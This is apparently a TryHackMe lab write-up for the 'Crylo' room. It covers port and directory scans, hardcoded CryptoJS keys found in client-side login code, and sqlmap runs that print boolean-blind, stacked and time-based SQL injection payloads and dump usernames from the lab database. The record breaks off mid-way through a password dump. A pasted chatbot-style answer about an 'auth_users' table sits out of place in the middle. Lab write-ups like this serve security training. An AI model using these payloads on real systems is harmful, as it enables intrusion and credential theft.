# Crylo — Writeup

## Overview
### Crylo — Writeup
### Crylo — Writeup
----
Learn about the CryptoJS library and JavaScript-based client-side encryption and decryption.
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/af0e7c2109847033d31d273498657526.png)
Start Machine
You have the IP address of your target. The goal is to find open ports and services to enumerate.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.244.109 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.244.109:22
Open 10.10.244.109:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org )
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.65s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.244.109 [2 ports]
Discovered open port 80/tcp on 10.10.244.109
Discovered open port 22/tcp on 10.10.244.109
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.244.109
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.244.109.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.244.109
Host is up, received user-set (0.22s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:7e:08:42:ea:bf:be:1a:1b:78:b0:f7:99:3c:ca:1d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDq29TL6bf/KCo3Nouny4N16JxUTh4xaGYNzD5ApI2lt3h5LhpFufJWTFsTlowZczIGXAmOu+v7IR9GJRgJzBW6e5Obqhk/TyU+YJvXPn+V2UzA1BUWqU5F3k0z62yAJKO9bEbGL3S60apZUp0EzvRc/JpX+Yq4cFo1KFhi15kiboXbWY4rz12KYPqmUb7MVz0KOuYxi8QY6/xJuuD3JIJtCJ2InK7QEnfUSaC7ULWI6L5036cGYp30VPpQ2cWrJeyxYbrySKO63w1O7NOVd+pjP0OSn217jSqlHUuzmsniXURWBepOsQg0LwwHf7tLHJMAzU9EnUn3VJdnYUzVpRROg8lglyErEGlgZtuIxlZMPnB5azf/sq8eGv6em/IePmuEfVpyGXtDmmWWTUKlHkVRODI8MdEk+CLQ2jkdgjr9M9p29iH37d453o4cKr4KNjXIDHkIm6JOblTf8G6VsHRYTr5qLRQQVhlFOZ5Lu3eZ3NUTQhT5tvOOflopTERCQT0=
|   256 f8:f3:90:83:b1:bc:87:e8:93:a0:ff:d5:bc:1f:d7:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNvoVED8flh/Rt6XI25dPE0dSrlaHxP057SjcgVeIyqksgwePweaAhM6pBMu4H+KU8lSiMq8CF7JOlBddocyx50=
|   256 b6:77:4d:a6:6d:73:79:15:ea:39:0c:f6:1b:b4:0b:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvaiGFkdeBEM+/LKf9E3kANwz0sdiiJ3pUyy+Sag/Mx
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Spicyo
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.95 seconds

┌──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://10.10.244.109 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.109
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.244.109/about                (Status: 200) [Size: 10720]
http://10.10.244.109/blog                 (Status: 200) [Size: 11402]
http://10.10.244.109/contact              (Status: 200) [Size: 8858]
http://10.10.244.109/debug                (Status: 403) [Size: 122]
http://10.10.244.109/login                (Status: 200) [Size: 13151]
Progress: 4614 / 4615 (99.98%)
===============================================================
 Finished
===============================================================
```
How many ports are open?
Try using port scanner
*2*
What is the 403/forbidden web page?
Try directory enumeration
*/debug*
### Task 2  Injection
The goal is to find a way to bypass the login. Find the username and password.
Answer the questions below

## Exploitation
```text
┌──(witty㉿kali)-[~]
└─$ wget http://10.10.244.109/static/images/404.png                      
--  http://10.10.244.109/static/images/404.png
Connecting to 10.10.244.109:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2348467 (2.2M) [image/png]
Saving to: ‘404.png’

404.png              100%[=====================>]   2.24M   628KB/s    in 3.8s    

(603 KB/s) - ‘404.png’ saved [2348467/2348467]

                                                                                   
┌──(witty㉿kali)-[~]
└─$ exiftool 404.png          
ExifTool Version Number         : 12.57
File Name                       : 404.png
Directory                       : .
File Size                       : 2.3 MB
File Modification Date/Time     : 2021:10:02 20:06:42-04:00
File Access Date/Time           : 2023:08:11 15:00:05-04:00
File Inode Change Date/Time     : 2023:08:11 15:00:05-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1308
Image Height                    : 851
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Software                        : Greenshot
Image Size                      : 1308x851
Megapixels                      : 1.1

function submitForm(oFormElement) {
    var xhr = new XMLHttpRequest();
    //xhr.responseType = 'json';
    xhr.onload = function() {
        var encryptedresp = xhr.responseText;
        var k = "8080808080808080";
        var key = CryptoJS.enc.Utf8.parse(k);
        var iv = CryptoJS.enc.Utf8.parse(k);
        var item = encryptedresp;
        var result = CryptoJS.AES.decrypt(item, key,
  {
      keySize: 128 / 4,
      iv: iv,
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.Pkcs7
  })
        var result = result.toString(CryptoJS.enc.Utf8);
        //////////var jsonResponse = JSON.parse(xhr.responseText);
        var jsonResponse = JSON.parse(result);
        //alert(xhr.responseText);
        //var jsonResponse = xhr.responseText;
        console.log(jsonResponse);
        if (jsonResponse.pin_set == "true") {
            //Redirect to 2fa
            //window.location.replace("/2fa");
            //document.getElementsByClassName
            document.getElementById("loginid").style.display = "none";
            document.getElementById("enterpinid").style.display = "flex";
        } else if (jsonResponse.pin_set == "false") {
            //redirect to set pin
            //window.location.replace("/set-pin");
            document.getElementById("loginid").style.display = "none";
            document.getElementById("createpinid").style.display = "flex";
        } else {
            // Invalid username/ password
            alert(jsonResponse.reason);
        }
    }
    xhr.open(oFormElement.method, oFormElement.action, true);
    xhr.send(new FormData(oFormElement));
    return false;
}

function encrypt() {
    var pass = document.getElementById('pin2').value; {
        //document.getElementById("hide").value = document.getElementById("pin").value;
        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
        key = CryptoJS.enc.Base64.parse(key);
        iv = CryptoJS.enc.Base64.parse(iv);
        var cipherData = CryptoJS.AES.encrypt(pass, key, {
            iv: iv
        });
        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });

        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
        //var hash = CryptoJS.MD5(pass);
        document.getElementById('pin2').value = cipherData;
        return true;
        console.log(document.getElementById('pin2').value)
    }
}

function encrypt2() {
    var pass = document.getElementById('pin3').value; {
        //document.getElementById("hide").value = document.getElementById("pin").value;
        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
        key = CryptoJS.enc.Base64.parse(key);
        iv = CryptoJS.enc.Base64.parse(iv);
        var cipherData = CryptoJS.AES.encrypt(pass, key, {
            iv: iv
        });
        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });

        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
        //var hash = CryptoJS.MD5(pass);
        document.getElementById('pin3').value = cipherData;
        return true;
        console.log(document.getElementById('pin3').value)
    }
}

Object { success: "false", reason: "User or Password is invalid" }

user: a'--

500 internal server (sqli)

┌──(witty㉿kali)-[~]
└─$ cat req_crylo 
POST /login HTTP/1.1
Host: 10.10.192.246
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.192.246/login
Content-Type: multipart/form-data; boundary=---------------------------24513989778820446811340418161
Content-Length: 484
Origin: http://10.10.192.246
Connection: close
Cookie: username=None; password=None; csrftoken=buC8yQFC6eFN9Yl7ker3kqDDKPXrLaJKnhAAKqealQPaU1y8oR73cZ9KWPPBjzyi

-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

┌──(witty㉿kali)-[~]
└─$ sqlmap -r req_crylo --risk 3 --level 3 --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:20:42 //

[15:20:42] [INFO] parsing HTTP request from 'req_crylo'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] y
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
[15:20:47] [INFO] testing connection to the target URL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
[15:20:49] [INFO] testing if the target URL content is stable
[15:20:50] [INFO] target URL content is stable
[15:20:50] [INFO] ignoring (custom) POST parameter 'MULTIPART csrfmiddlewaretoken'
[15:20:50] [INFO] testing if (custom) POST parameter 'MULTIPART username' is dynamic
[15:20:51] [WARNING] (custom) POST parameter 'MULTIPART username' does not appear to be dynamic
[15:20:51] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'MULTIPART username' might not be injectable
[15:20:52] [INFO] testing for SQL injection on (custom) POST parameter 'MULTIPART username'
[15:20:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:21:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[15:21:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[15:22:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[15:22:03] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --code=200)
[15:22:11] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] y
[15:23:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[15:23:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[15:23:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[15:23:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[15:23:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[15:23:41] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[15:23:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[15:23:42] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[15:23:43] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:23:43] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:23:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:23:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:23:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[15:23:45] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[15:23:45] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:23:46] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[15:23:47] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[15:23:47] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[15:23:47] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[15:23:47] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[15:23:47] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[15:23:47] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[15:23:47] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[15:23:47] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[15:23:47] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[15:23:47] [INFO] testing 'Generic inline queries'
[15:23:48] [INFO] testing 'MySQL inline queries'
[15:23:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[15:24:00] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[15:24:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:24:12] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[15:24:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:24:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:24:13] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:24:16] [INFO] target URL appears to have 11 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[15:29:55] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[15:30:04] [INFO] target URL appears to be UNION injectable with 11 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[15:31:01] [INFO] testing 'Generic UNION query (85) - 21 to 40 columns'
[15:31:10] [INFO] testing 'Generic UNION query (85) - 41 to 60 columns'
[15:31:18] [INFO] testing 'MySQL UNION query (85) - 1 to 20 columns'
[15:31:52] [INFO] testing 'MySQL UNION query (85) - 21 to 40 columns'
[15:32:00] [INFO] testing 'MySQL UNION query (85) - 41 to 60 columns'
[15:32:09] [INFO] testing 'MySQL UNION query (85) - 61 to 80 columns'
[15:32:18] [INFO] testing 'MySQL UNION query (85) - 81 to 100 columns'
[15:32:26] [INFO] checking if the injection point on (custom) POST parameter 'MULTIPART username' is a false positive
(custom) POST parameter 'MULTIPART username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 588 HTTP(s) requests:
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND 3386=(SELECT (CASE WHEN (3386=3386) THEN 3386 ELSE (SELECT 9893 UNION SELECT 8553) END))-- QIDa
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test';SELECT SLEEP(5)#
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND (SELECT 4354 FROM (SELECT(SLEEP(5)))zdLd)-- Ccko
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--
---
[15:32:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[15:32:43] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:32:43] [INFO] fetching current database
[15:32:43] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:32:43] [INFO] retrieved: food
[15:32:57] [INFO] fetching tables for database: 'food'
[15:32:57] [INFO] fetching number of tables for database 'food'
[15:32:57] [INFO] retrieved: 13
[15:33:02] [INFO] retrieved: accounts_pin
[15:33:42] [INFO] retrieved: accounts_pintoken
[15:34:05] [INFO] retrieved: accounts_upload
[15:34:30] [INFO] retrieved: auth_group
[15:35:01] [INFO] retrieved: auth_group_permissions
[15:35:45] [INFO] retrieved: auth_permission
[15:36:20] [INFO] retrieved: auth_user
[15:36:38] [INFO] retrieved: auth_user_groups
[15:37:07] [INFO] retrieved: auth_user_user_permissions
[15:38:05] [INFO] retrieved: django_admin_log
[15:38:56] [INFO] retrieved: django_content_type
[15:39:40] [INFO] retrieved: django_migrations
[15:40:16] [INFO] retrieved: django_session
[15:40:42] [INFO] fetching columns for table 'auth_group' in database 'food'
[15:40:42] [INFO] retrieved: 2
[15:40:46] [INFO] retrieved: id
[15:40:54] [INFO] retrieved: name
[15:41:07] [INFO] fetching entries for table 'auth_group' in database 'food'
[15:41:07] [INFO] fetching number of entries for table 'auth_group' in database 'food'
[15:41:07] [INFO] retrieved: 0
[15:41:10] [WARNING] table 'auth_group' in database 'food' appears to be empty
Database: food
Table: auth_group
[0 entries]
+----+------+
| id | name |
+----+------+
+----+------+

[15:41:10] [INFO] table 'food.auth_group' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.192.246/dump/food/auth_group.csv'
[15:41:10] [INFO] fetching columns for table 'auth_user_user_permissions' in database 'food'
[15:41:10] [INFO] retrieved: 3
[15:41:13] [INFO] retrieved: id
[15:41:21] [INFO] retrieved: permission_id
[15:42:02] [INFO] retrieved: user_id
[15:42:27] [INFO] fetching entries for table 'auth_user_user_permissions' in database 'food'
[15:42:27] [INFO] fetching number of entries for table 'auth_user_user_permissions' in database 'food'
[15:42:27] [INFO] retrieved: 0
[15:42:30] [WARNING] table 'auth_user_user_permissions' in database 'food' appears to be empty
Database: food
Table: auth_user_user_permissions
[0 entries]
+----+---------+---------------+
| id | user_id | permission_id |
+----+---------+---------------+
+----+---------+---------------+

Certainly, here's an example of an SQL query to create an "auth_users" table with the basic structure I mentioned earlier:

sql

`CREATE TABLE auth_users (     id INT PRIMARY KEY,     username VARCHAR(50) NOT NULL,     password VARCHAR(100) NOT NULL,     email VARCHAR(100) NOT NULL,     first_name VARCHAR(50),     last_name VARCHAR(50),     is_active BOOLEAN NOT NULL,     is_staff BOOLEAN NOT NULL,     is_superuser BOOLEAN NOT NULL,     date_joined TIMESTAMP NOT NULL );`

This SQL query creates a table named "auth_users" with fields that correspond to the basic structure I described earlier. Please note that you might need to adjust the data types and constraints based on the specific database system you're using. Also, remember that storing plain text passwords is not recommended; in practice, passwords should be hashed using a strong hashing algorithm like bcrypt or Argon2.

┌──(witty㉿kali)-[~]
└─$ sqlmap -r req_crylo --dump -T auth_user -C username
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:44:36 //

[15:44:36] [INFO] parsing HTTP request from 'req_crylo'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] y
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
[15:44:41] [INFO] resuming back-end DBMS 'mysql' 
[15:44:41] [INFO] testing connection to the target URL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND 3386=(SELECT (CASE WHEN (3386=3386) THEN 3386 ELSE (SELECT 9893 UNION SELECT 8553) END))-- QIDa
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test';SELECT SLEEP(5)#
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND (SELECT 4354 FROM (SELECT(SLEEP(5)))zdLd)-- Ccko
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--
---
[15:44:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[15:44:42] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:44:42] [INFO] fetching current database
[15:44:42] [INFO] resumed: food
[15:44:42] [INFO] fetching entries of column(s) 'username' for table 'auth_user' in database 'food'
[15:44:42] [INFO] fetching number of column(s) 'username' entries for table 'auth_user' in database 'food'
[15:44:42] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:44:42] [INFO] retrieved: 2
[15:44:46] [INFO] retrieved: admin
[15:45:03] [INFO] retrieved: anof
Database: food
Table: auth_user
[2 entries]
+----------+
| username |
+----------+
| admin    |
| anof     |
+----------+

[15:45:17] [INFO] table 'food.auth_user' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.192.246/dump/food/auth_user.csv'
[15:45:17] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 40 times
[15:45:17] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.192.246'
[15:45:17] [WARNING] your sqlmap version is outdated

[*] ending @ 15:45:17 //

┌──(witty㉿kali)-[~]
└─$ sqlmap -r req_crylo --dump -T auth_user -C password
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:49:16 //

[15:49:16] [INFO] parsing HTTP request from 'req_crylo'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] y
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
[15:49:18] [INFO] resuming back-end DBMS 'mysql' 
[15:49:18] [INFO] testing connection to the target URL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND 3386=(SELECT (CASE WHEN (3386=3386) THEN 3386 ELSE (SELECT 9893 UNION SELECT 8553) END))-- QIDa
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test';SELECT SLEEP(5)#
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

